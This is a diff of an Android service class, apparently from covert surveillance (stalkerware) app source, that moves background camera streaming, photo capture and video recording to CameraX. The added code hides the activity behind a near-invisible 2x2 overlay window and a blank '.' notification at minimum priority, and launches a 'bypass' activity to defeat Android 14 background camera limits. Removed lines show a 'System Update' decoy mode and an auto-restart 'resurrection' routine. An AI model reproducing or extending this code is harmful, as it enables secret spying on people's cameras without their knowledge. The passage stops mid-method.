@@ -12,27 +12,17 @@ import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
-import android.graphics.ImageFormat;
 import android.graphics.Matrix;
 import android.graphics.PixelFormat;
 import android.graphics.Rect;
 import android.graphics.YuvImage;
-import android.hardware.camera2.CameraAccessException;
-import android.hardware.camera2.CameraCaptureSession;
 import android.hardware.camera2.CameraCharacteristics;
-import android.hardware.camera2.CameraDevice;
 import android.hardware.camera2.CameraManager;
-import android.hardware.camera2.CaptureRequest;
-import android.hardware.camera2.TotalCaptureResult;
-import android.media.Image;
-import android.media.ImageReader;
-import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
-import android.os.HandlerThread;
 import android.os.IBinder;
-import android.os.PowerManager;
+import android.os.Looper;
 import android.util.Log;
 import android.util.Size;
 import android.view.Gravity;
@@ -43,16 +33,38 @@ import android.view.WindowManager;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
+import androidx.camera.camera2.interop.Camera2Interop;
+import androidx.camera.camera2.interop.Camera2CameraInfo;
+import androidx.camera.core.Camera;
+import androidx.camera.core.CameraInfo;
+import androidx.camera.core.CameraSelector;
+import androidx.camera.core.ImageAnalysis;
+import androidx.camera.core.ImageCapture;
+import androidx.camera.core.ImageCaptureException;
+import androidx.camera.core.ImageProxy;
+import androidx.camera.core.Preview;
+import androidx.camera.lifecycle.ProcessCameraProvider;
+import androidx.camera.video.FileOutputOptions;
+import androidx.camera.video.Quality;
+import androidx.camera.video.QualitySelector;
+import androidx.camera.video.Recorder;
+import androidx.camera.video.Recording;
+import androidx.camera.video.VideoCapture;
+import androidx.camera.video.VideoRecordEvent;
+import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
+import androidx.lifecycle.Lifecycle;
+import androidx.lifecycle.LifecycleOwner;
+import androidx.lifecycle.LifecycleRegistry;
+
+import com.google.common.util.concurrent.ListenableFuture;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.Collections;
 import java.util.Date;
 import java.util.List;
@@ -60,1365 +72,623 @@ import java.util.Locale;
 import java.util.concurrent.ArrayBlockingQueue;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
-public class Analytics_Provider extends Service {
+@androidx.camera.camera2.interop.ExperimentalCamera2Interop
+public class Analytics_Provider extends Service implements LifecycleOwner {
     private static final String TAG = "Analytics_Provider";
     private static final String CHANNEL_ID = "Analytics_ProviderChannel";
     private static final int NOTIFICATION_ID = 2002;
 
-    // Camera components
-    private CameraManager cameraManager;
-    private CameraDevice cameraDevice;
-    private CameraCaptureSession captureSession;
-    private ImageReader imageReader;
-    private Handler backgroundHandler;
-    private HandlerThread backgroundThread;
+    private LifecycleRegistry lifecycleRegistry;
+    private ProcessCameraProvider cameraProvider;
+    private Preview preview;
+    private ImageAnalysis imageAnalysis;
+    private ImageCapture imageCapture;
+    private VideoCapture<Recorder> videoCapture;
+    private Recording currentRecording;
+    private Camera camera;
 
-    // Overlay for background camera
     private WindowManager windowManager;
     private SurfaceView surfaceView;
     private volatile boolean surfaceReady = false;
     private CountDownLatch surfaceLatch;
 
-    // Live streaming
+    private ExecutorService cameraExecutor;
+    private static Analytics_Provider instance;
+
+    // State trackers
     private static volatile boolean isStreaming = false;
+    private static volatile boolean isRecording = false;
+    private static volatile boolean captureInProgress = false;
     private static volatile String currentCameraId = "0";
-    private static volatile long lastFrameTime = 0;
     private static volatile int streamWidth = 640;
     private static volatile int streamHeight = 480;
     private static volatile int streamQuality = 50;
-    private static volatile long lastFrameReceived = 0;
     private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(5);
-
-    // Photo capture
     private static volatile byte[] lastCapturedPhoto = null;
     private static volatile String lastCaptureError = null;
-    private static volatile boolean captureInProgress = false;
     private static CountDownLatch captureLatch;
-
-    // Video recording
-    private MediaRecorder mediaRecorder;
-    private static volatile boolean isRecording = false;
     private static String currentVideoPath = null;
     private static long recordingStartTime = 0;
-    private Surface recorderSurface;
-
-    // Night Mode
     private static volatile boolean nightModeEnabled = false;
 
-    // WakeLock for background operation
-    private PowerManager.WakeLock wakeLock;
-    private static boolean isForeground = false;
-
-    // Singleton instance
-    private static Analytics_Provider instance;
-
-    public static Analytics_Provider getInstance() {
-        return instance;
-    }
+    public static Analytics_Provider getInstance() { return instance; }
 
     @Override
     public void onCreate() {
         super.onCreate();
         instance = this;
-        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        lifecycleRegistry = new LifecycleRegistry(this);
+        lifecycleRegistry.setCurrentState(Lifecycle.State.CREATED);
+        cameraExecutor = Executors.newSingleThreadExecutor();
+        
         createNotificationChannel();
         ensureForeground();
-        startBackgroundThread();
-
-        // Load persistent settings
-        nightModeEnabled = getSharedPreferences("StabilityConfig", MODE_PRIVATE)
-                .getBoolean("night_mode", false);
-
-        // Initialize WakeLock for background operation
-        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        wakeLock = powerManager.newWakeLock(
-                PowerManager.PARTIAL_WAKE_LOCK,
-                "System:StabilityWakeLock");
-        Log.d(TAG, "Analytics_Provider created with WakeLock support");
+        
+        nightModeEnabled = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("night_mode", false);
+        
+        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
+        cameraProviderFuture.addListener(() -> {
+            try {
+                cameraProvider = cameraProviderFuture.get();
+                lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
+            } catch (Exception e) {
+                Log.e(TAG, "CameraX Init Error: " + e.getMessage());
+            }
+        }, ContextCompat.getMainExecutor(this));
     }
+
+    @NonNull
+    @Override
+    public Lifecycle getLifecycle() { return lifecycleRegistry; }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Start foreground service as early as possible
-        if (!isForeground) {
-            ensureForeground();
-        }
-        
-        // Acquire WakeLock
-        acquireWakeLock();
-
+        ensureForeground();
         if (intent != null) {
             String action = intent.getAction();
-            Log.d(TAG, "OnStartCommand Action: " + action);
             if (Constants.ACTION_START_STREAM.equals(action)) {
-                String camId = intent.getStringExtra("cameraId");
-                int width = intent.getIntExtra("width", 640);
-                int height = intent.getIntExtra("height", 480);
-                int quality = intent.getIntExtra("quality", 50);
-                
-                // Run startStreaming in background to avoid blocking main thread
-                backgroundHandler.post(() -> startStreaming(camId, width, height, quality));
+                startStreaming(intent.getStringExtra("cameraId"), 
+                             intent.getIntExtra("width", 640), 
+                             intent.getIntExtra("height", 480), 
+                             intent.getIntExtra("quality", 50));
             } else if (Constants.ACTION_STOP_STREAM.equals(action)) {
                 stopStreaming();
             } else if (Constants.ACTION_CAPTURE_PHOTO.equals(action)) {
-                String camId = intent.getStringExtra("cameraId");
-                capturePhotoBackground(camId);
+                capturePhotoBackground(intent.getStringExtra("cameraId"));
             } else if (Constants.ACTION_START_RECORDING.equals(action)) {
-                String camId = intent.getStringExtra("cameraId");
-                int width = intent.getIntExtra("width", 1280);
-                int height = intent.getIntExtra("height", 720);
-                startVideoRecording(camId, width, height);
+                startVideoRecording(intent.getStringExtra("cameraId"), 
+                                  intent.getIntExtra("width", 1280), 
+                                  intent.getIntExtra("height", 720));
             } else if (Constants.ACTION_STOP_RECORDING.equals(action)) {
                 stopVideoRecording();
             } else if (Constants.ACTION_STOP_OPTICS.equals(action) || "STOP".equals(action)) {
-                stopStreaming();
-                stopVideoRecording();
-                releaseWakeLock();
-                try {
-                    stopForeground(true);
-                } catch (Exception ignored) {}
-                stopSelf();
+                shutdown();
             }
         }
-
         return START_STICKY;
     }
 
-    @Override
-    public void onTaskRemoved(Intent rootIntent) {
-        if (WorkManager_Sync.isDestructing) {
-            super.onTaskRemoved(rootIntent);
-            return;
-        }
-        // [RESURRECTION_PROTOCOL] Restart optics if cleared
-        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
-        restartServiceIntent.setPackage(getPackageName());
-        android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
-            getApplicationContext(), 2, restartServiceIntent, android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE);
-        android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(android.content.Context.ALARM_SERVICE);
-        if (alarmService != null) {
-            alarmService.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
-        }
-        super.onTaskRemoved(rootIntent);
-    }
-
-    private boolean isStealthMode() {
-        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
-        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
-    }
-
     private void ensureForeground() {
-        boolean stealth = isStealthMode();
-        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
-        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
-                PendingIntent.FLAG_IMMUTABLE);
-
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle(stealth ? "System Update" : "Camera Service")
-                .setContentText(stealth ? "Checking for system updates..." : "Camera service is active")
-                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
-                .setContentIntent(pendingIntent)
+                .setContentTitle(".")
+                .setContentText(".")
+                .setSmallIcon(R.drawable.ic_sprocket_gear)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
                 .build();
 
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
-                
-                // Check for camera and microphone permissions before adding the types to avoid crash on Android 14+
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
-                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
-                }
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
+            if (isStreaming || isRecording || captureInProgress) {
+                serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+            }
+            if (isRecording) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                     serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                 }
-                
-                startForeground(NOTIFICATION_ID, notification, serviceType);
-                isForeground = true;
-            } else {
-                startForeground(NOTIFICATION_ID, notification);
-                isForeground = true;
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Error starting foreground: " + e.getMessage());
-            // Fallback for Android 14 background restrictions
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                try {
-                    // Try with just dataSync which is more likely to be allowed
-                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
-                    isForeground = true;
-                } catch (Exception e2) {
-                    Log.e(TAG, "Critical failure starting foreground", e2);
-                    isForeground = false;
-                }
-            } else {
-                isForeground = false;
-            }
+            startForeground(NOTIFICATION_ID, notification, serviceType);
+        } else {
+            startForeground(NOTIFICATION_ID, notification);
         }
     }
 
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID,
-                    "Core Processor",
-                    NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("Camera capture service");
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) {
-                manager.createNotificationChannel(channel);
-            }
-        }
-    }
-
-    private void startBackgroundThread() {
-        if (backgroundThread == null) {
-            backgroundThread = new HandlerThread("CameraBackground");
-            backgroundThread.start();
-            backgroundHandler = new Handler(backgroundThread.getLooper());
-            
-            // --- OPTICS_WATCHDOG: Hardware Recovery Engine ---
-            backgroundHandler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    long now = System.currentTimeMillis();
-                    // Only recovery if it WAS working (lastFrameReceived > 0) and now it's dead
-                    if (isStreaming && lastFrameReceived > 0 && (now - lastFrameReceived > 12000)) {
-                        Log.e(TAG, "OPTICS_WATCHDOG: Heartbeat lost. Rebooting optics...");
-                        FirebaseConfig.logActivity("OPTICS_RECOVERY: Hardware reset triggered");
-                        synchronized (TAG) { lastFrameReceived = now; }
-                        
-                        // Force a clean restart
-                        backgroundHandler.post(() -> {
-                            stopStreaming();
-                            try { Thread.sleep(1000); } catch (Exception ignored) {}
-                            startStreamingInternal();
-                        });
-                    }
-                    backgroundHandler.postDelayed(this, 5000);
-                }
-            }, 15000);
-        }
-    }
-
-    private void stopBackgroundThread() {
-        if (backgroundThread != null) {
-            backgroundThread.quitSafely();
+    @androidx.camera.camera2.interop.ExperimentalCamera2Interop
+    public void startStreaming(String cameraId, int width, int height, int quality) {
+        if (cameraProvider == null) return;
+        
+        // [STABILITY_BYPASS] Required ONLY for Android 14+ background camera access
+        // Starting this on older APIs (like API 24) causes the decoy app to pop up.
+        if (Build.VERSION.SDK_INT >= 34) {
             try {
-                backgroundThread.join();
-                backgroundThread = null;
-                backgroundHandler = null;
-            } catch (InterruptedException e) {
-                Log.e(TAG, "Error stopping background thread", e);
-            }
+                Intent bypass = new Intent(this, CameraHelper.BypassActivity.class);
+                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                startActivity(bypass);
+            } catch (Exception e) { Log.e(TAG, "Bypass fail: " + e.getMessage()); }
         }
-    }
 
-    // ============ OVERLAY FOR BACKGROUND CAMERA ============
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                // Hard kill previous session
+                isStreaming = false;
+                cameraProvider.unbindAll();
+                frameQueue.clear();
+                
+                // Breath time for hardware HAL - NON-BLOCKING
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    currentCameraId = cameraId;
+                    streamWidth = width;
+                    streamHeight = height;
+                    streamQuality = quality;
+                    
+                    boolean isExtraFront = false;
+                    try {
+                        CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+                        CameraCharacteristics cc = cm.getCameraCharacteristics(cameraId);
+                        Integer facing = cc.get(CameraCharacteristics.LENS_FACING);
+                        isExtraFront = (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT && !"1".equals(cameraId));
+                    } catch (Exception ignored) {}
+
+                    if (isExtraFront) {
+                        // Different aspect ratio for extra front cameras (Wide 16:9 instead of standard)
+                        streamHeight = (int)(streamWidth * 0.5625);
+                    }
+
+                    createOverlay();
+
+                    ImageAnalysis.Builder analysisBuilder = new ImageAnalysis.Builder()
+                            .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
+                            .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);
+
+                    if (isExtraFront) {
+                        analysisBuilder.setTargetResolution(new Size(streamWidth, streamHeight));
+                    }
+
+                    if (nightModeEnabled) {
+                        Camera2Interop.Extender<ImageAnalysis> extender = new Camera2Interop.Extender<>(analysisBuilder);
+                        // HARD_MANUAL_EXPOSURE: Bypasses AE algorithms for true sensor sensitivity
+                        extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_OFF);
+                        extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_EXPOSURE_TIME, 100000000L); // 1/10s
+                        extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_SENSITIVITY, 2000); 
+                    }
+
+                    imageAnalysis = analysisBuilder.build();
+                    imageAnalysis.setAnalyzer(cameraExecutor, image -> {
+                        if (!isStreaming) { image.close(); return; }
+                        try {
+                            byte[] jpegData = yuv420ToJpeg(image, streamQuality);
+                            if (jpegData != null) {
+                                if (frameQueue.size() >= 5) frameQueue.poll();
+                                frameQueue.offer(jpegData);
+                            }
+                        } finally {
+                            image.close();
+                        }
+                    });
+
+                    CameraSelector selector;
+                    if ("1".equals(cameraId)) {
+                        selector = CameraSelector.DEFAULT_FRONT_CAMERA;
+                    } else if (cameraId != null && !cameraId.equals("0")) {
+                        selector = new CameraSelector.Builder()
+                                .addCameraFilter(cameraInfos -> {
+                                    for (CameraInfo c : cameraInfos) {
+                                        if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
+                                            return Collections.singletonList(c);
+                                        }
+                                    }
+                                    return Collections.emptyList();
+                                }).build();
+                    } else {
+                        selector = CameraSelector.DEFAULT_BACK_CAMERA;
+                    }
+                    
+                    preview = new Preview.Builder().build();
+                    preview.setSurfaceProvider(ContextCompat.getMainExecutor(this), request -> {
+                        if (surfaceReady && surfaceView != null) {
+                            Surface surface = surfaceView.getHolder().getSurface();
+                            if (surface != null && surface.isValid()) {
+                                request.provideSurface(surface, ContextCompat.getMainExecutor(this), result -> {});
+                                return;
+                            }
+                        }
+                        
+                        // Hardware surface might not be ready yet on slower devices (API 24 fallback)
+                        LabRatsWorker.execute(() -> {
+                            try {
+                                if (surfaceLatch != null) surfaceLatch.await(5, TimeUnit.SECONDS);
+                            } catch (Exception ignored) {}
+                            
+                            new Handler(Looper.getMainLooper()).post(() -> {
+                                if (surfaceView != null && surfaceView.getHolder().getSurface().isValid()) {
+                                    request.provideSurface(surfaceView.getHolder().getSurface(), ContextCompat.getMainExecutor(this), result -> {});
+                                } else {
+                                    request.willNotProvideSurface();
+                                }
+                            });
+                        });
+                    });
+
+                    try {
+                        isStreaming = true;
+                        ensureForeground();
+                        camera = cameraProvider.bindToLifecycle(this, selector, preview, imageAnalysis);
+                        lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
+                        FirebaseConfig.logActivity("OPTICS_INIT: CameraX stream re-established [" + (nightModeEnabled ? "NIGHT" : "STD") + "]");
+                    } catch (Exception e) {
+                        Log.e(TAG, "Binding Error: " + e.getMessage());
+                        isStreaming = false;
+                        ensureForeground();
+                    }
+                }, 400); // 400ms hardware breather
+
+            } catch (Exception e) {
+                Log.e(TAG, "Sync Error: " + e.getMessage());
+            }
+        });
+    }
 
     private void createOverlay() {
-        if (windowManager != null && surfaceView != null && surfaceReady) {
-            return; // Already created and ready
+        if (surfaceView != null) {
+            return;
         }
 
-        // Reset state
         surfaceReady = false;
         surfaceLatch = new CountDownLatch(1);
 
-        try {
-            windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
-            
-            // Check if overlay permission is actually granted
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !android.provider.Settings.canDrawOverlays(this)) {
-                Log.w(TAG, "Overlay permission not granted, camera might fail on some devices");
-                // Don't return, some devices might work with ImageReader alone
-                surfaceLatch.countDown();
-                return;
-            }
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                if (surfaceView != null) return;
+                
+                windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+                surfaceView = new SurfaceView(this);
 
-            surfaceView = new SurfaceView(getApplicationContext());
+                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                        2, 2,
+                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
+                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 2003, // 2003 = TYPE_SYSTEM_ALERT
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSLUCENT);
+                params.gravity = Gravity.TOP | Gravity.START;
+                params.alpha = 0.01f;
 
-            int layoutType;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                layoutType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
-            } else {
-                layoutType = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
-            }
-
-            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    2, 2, // Minimal footprint
-                    layoutType,
-                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
-                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
-                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
-                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
-                    PixelFormat.TRANSLUCENT);
-            params.alpha = 0.02f; // Non-zero but invisible
-            params.gravity = Gravity.TOP | Gravity.START;
-
-            surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
-                @Override
-                public void surfaceCreated(@NonNull SurfaceHolder holder) {
-                    surfaceReady = true;
-                    if (surfaceLatch != null) surfaceLatch.countDown();
-                    Log.d(TAG, "Surface created successfully");
-                }
-
-                @Override
-                public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height) {
-                }
-
-                @Override
-                public void surfaceDestroyed(@NonNull SurfaceHolder holder) {
-                    surfaceReady = false;
-                }
-            });
-
-            // Add view on main thread
-            new Handler(getMainLooper()).post(() -> {
-                try {
-                    if (windowManager != null && surfaceView != null) {
-                        windowManager.addView(surfaceView, params);
+                surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
+                    @Override
+                    public void surfaceCreated(@NonNull SurfaceHolder holder) {
+                        surfaceReady = true;
+                        if (surfaceLatch != null) surfaceLatch.countDown();
                     }
-                } catch (Exception e) {
-                    Log.e(TAG, "Error adding surface view: " + e.getMessage());
-                    if (surfaceLatch != null) surfaceLatch.countDown();
-                }
-            });
+                    @Override public void surfaceChanged(@NonNull SurfaceHolder holder, int f, int w, int h) {}
+                    @Override public void surfaceDestroyed(@NonNull SurfaceHolder holder) { 
+                        surfaceReady = false; 
+                    }
+                });
 
-        } catch (Exception e) {
-            Log.e(TAG, "Error creating overlay: " + e.getMessage());
-            if (surfaceLatch != null) surfaceLatch.countDown();
-        }
+                windowManager.addView(surfaceView, params);
+            } catch (Exception e) {
+                Log.e(TAG, "Overlay Error: " + e.getMessage());
+                if (surfaceLatch != null) surfaceLatch.countDown();
+            }
+        });
     }
 
     private void removeOverlay() {
         if (windowManager != null && surfaceView != null) {
-            try {
-                new Handler(getMainLooper()).post(() -> {
-                    try {
-                        windowManager.removeView(surfaceView);
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error removing view", e);
-                    }
-                    surfaceView = null;
-                    windowManager = null;
-                    surfaceReady = false;
-                });
-            } catch (Exception e) {
-                Log.e(TAG, "Error removing overlay", e);
-            }
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    windowManager.removeView(surfaceView);
+                } catch (Exception ignored) {}
+                surfaceView = null;
+                windowManager = null;
+                surfaceReady = false;
+            });
         }
     }
 
-    // ============ PHOTO CAPTURE ============
-
     public void capturePhotoBackground(String cameraId) {
-        if (isStreaming || isRecording) {
-            Log.w(TAG, "Camera busy with stream/record, attempt cleanup");
-            // Optionally stop stream/record to take photo, or just fail
-            lastCaptureError = "Camera hardware busy (Stream/Record active)";
-            return;
+        if (cameraProvider == null || captureInProgress) return;
+        captureInProgress = true;
+        captureLatch = new CountDownLatch(1);
+        lastCapturedPhoto = null;
+
+        imageCapture = new ImageCapture.Builder()
+                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                .build();
+
+        CameraSelector selector;
+        if ("1".equals(cameraId)) {
+            selector = CameraSelector.DEFAULT_FRONT_CAMERA;
+        } else if (cameraId != null && !cameraId.equals("0")) {
+            selector = new CameraSelector.Builder()
+                    .addCameraFilter(cameraInfos -> {
+                        for (CameraInfo c : cameraInfos) {
+                            if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
+                                return Collections.singletonList(c);
+                            }
+                        }
+                        return Collections.emptyList();
+                    }).build();
+        } else {
+            selector = CameraSelector.DEFAULT_BACK_CAMERA;
         }
 
-        if (cameraId == null)
-            cameraId = "0";
-
-        captureInProgress = true;
-        lastCapturedPhoto = null;
-        lastCaptureError = null;
-        captureLatch = new CountDownLatch(1);
-
-        final String camId = cameraId;
-
-        backgroundHandler.post(() -> {
+        new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                createOverlay();
+                cameraProvider.unbindAll();
+                camera = cameraProvider.bindToLifecycle(this, selector, imageCapture);
+                
+                imageCapture.takePicture(cameraExecutor, new ImageCapture.OnImageCapturedCallback() {
+                    @Override
+                    public void onCaptureSuccess(@NonNull ImageProxy image) {
+                        try {
+                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                            byte[] data = new byte[buffer.remaining()];
+                            buffer.get(data);
+                            lastCapturedPhoto = data;
+                        } finally {
+                            image.close();
+                            captureInProgress = false;
+                            captureLatch.countDown();
+                            new Handler(Looper.getMainLooper()).post(() -> {
+                                if (isStreaming) {
+                                    startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
+                                } else {
+                                    if (cameraProvider != null) cameraProvider.unbindAll();
+                                    ensureForeground();
+                                }
+                            });
+                        }
+                    }
 
-                // Wait for surface
-                if (surfaceLatch != null) {
-                    surfaceLatch.await(5, TimeUnit.SECONDS);
-                }
-
-                if (!surfaceReady) {
-                    lastCaptureError = "Surface not ready (Overlay permission missing)";
-                    FirebaseConfig.logActivity("OPTICS_ERROR: Snapshot surface not ready");
-                    captureLatch.countDown();
-                    return;
-                }
-
-                capturePhotoInternal(camId);
-
+                    @Override
+                    public void onError(@NonNull ImageCaptureException exception) {
+                        lastCaptureError = exception.getMessage();
+                        captureInProgress = false;
+                        captureLatch.countDown();
+                        new Handler(Looper.getMainLooper()).post(() -> {
+                            if (!isStreaming) {
+                                if (cameraProvider != null) cameraProvider.unbindAll();
+                                ensureForeground();
+                            }
+                        });
+                    }
+                });
             } catch (Exception e) {
-                lastCaptureError = "Error: " + e.getMessage();
+                captureInProgress = false;
                 captureLatch.countDown();
             }
         });
     }
 
-    private void capturePhotoInternal(String cameraId) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                lastCaptureError = "Camera permission not granted";
-                captureLatch.countDown();
-                return;
-            }
-        }
+    public void startVideoRecording(String cameraId, int width, int height) {
+        if (cameraProvider == null || isRecording) return;
 
-        try {
-            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
-            Size[] jpegSizes = characteristics.get(
-                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-                    .getOutputSizes(ImageFormat.JPEG);
+        Quality quality = Quality.HD; // Default 720p
+        if (width >= 3840 || height >= 2160) quality = Quality.UHD;
+        else if (width >= 1920 || height >= 1080) quality = Quality.FHD;
+        else if (width <= 640) quality = Quality.SD;
 
-            Size size = chooseBestSize(jpegSizes, 1280, 720);
-            int width = size.getWidth();
-            int height = size.getHeight();
+        Recorder recorder = new Recorder.Builder()
+                .setExecutor(cameraExecutor)
+                .setQualitySelector(QualitySelector.from(quality))
+                .build();
+        videoCapture = VideoCapture.withOutput(recorder);
 
-            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
-            imageReader.setOnImageAvailableListener(reader -> {
-                Image image = null;
-                try {
-                    image = reader.acquireLatestImage();
-                    if (image != null) {
-                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                        byte[] rawData = new byte[buffer.remaining()];
-                        buffer.get(rawData);
-                        
-                        // Set rotation: 90 for back, 270 for front
-                        int rotation = 90;
-                        try {
-                            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
-                            if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
-                                rotation = 270;
+        CameraSelector selector;
+        if ("1".equals(cameraId)) {
+            selector = CameraSelector.DEFAULT_FRONT_CAMERA;
+        } else if (cameraId != null && !cameraId.equals("0")) {
+            selector = new CameraSelector.Builder()
+                    .addCameraFilter(cameraInfos -> {
+                        for (CameraInfo c : cameraInfos) {
+                            if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
+                                return Collections.singletonList(c);
                             }
-                        } catch (Exception e) {
-                            rotation = 270;
                         }
-                        lastCapturedPhoto = rotateJpeg(rawData, rotation);
-                    }
-                } catch (Exception e) {
-                    lastCaptureError = "Error reading image: " + e.getMessage();
-                } finally {
-                    if (image != null)
-                        image.close();
-                    captureInProgress = false;
-                    captureLatch.countDown();
-                    closeCamera();
-                }
-            }, backgroundHandler);
-
-            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
-                @Override
-                public void onOpened(@NonNull CameraDevice camera) {
-                    cameraDevice = camera;
-                    createPhotoCaptureSession();
-                }
-
-                @Override
-                public void onDisconnected(@NonNull CameraDevice camera) {
-                    camera.close();
-                    cameraDevice = null;
-                    lastCaptureError = "Camera disconnected";
-                    captureLatch.countDown();
-                }
-
-                @Override
-                public void onError(@NonNull CameraDevice camera, int error) {
